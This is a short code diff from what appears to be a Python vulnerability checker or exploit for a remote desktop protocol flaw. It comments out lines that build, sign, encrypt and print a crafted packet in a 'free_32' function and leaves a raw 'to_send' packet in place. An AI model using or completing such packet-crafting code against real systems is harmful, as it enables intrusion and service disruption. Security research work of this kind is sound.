@@ -332,18 +332,18 @@ def test_if_vuln_64(crypter):
 
 def free_32(crypter):
 
-    packet_hdr = binascii.unhexlify('0300003502f08064000703ef708026')
-    sec_hdr = binascii.unhexlify('08000000')
+    # packet_hdr = binascii.unhexlify('0300003502f08064000703ef708026')
+    # sec_hdr = binascii.unhexlify('08000000')
 
-    packet = binascii.unhexlify(
-        '1200000003000000000000000200000000000000000000005A5A')
+    # packet = binascii.unhexlify(
+    #     '1200000003000000000000000200000000000000000000005A5A')
 
-    packet_sig = crypter.sign(packet)
-    packet_enc = crypter.encrypt(packet)
+    # packet_sig = crypter.sign(packet)
+    # packet_enc = crypter.encrypt(packet)
 
-    print("以下为输出内容：")
+    # print("以下为输出内容：")
 
-    print(packet_hdr + sec_hdr + packet_sig + packet_enc)
+    # print(packet_hdr + sec_hdr + packet_sig + packet_enc)
 
     to_send = binascii.unhexlify('000000000200000000000000000000005A5A')
 
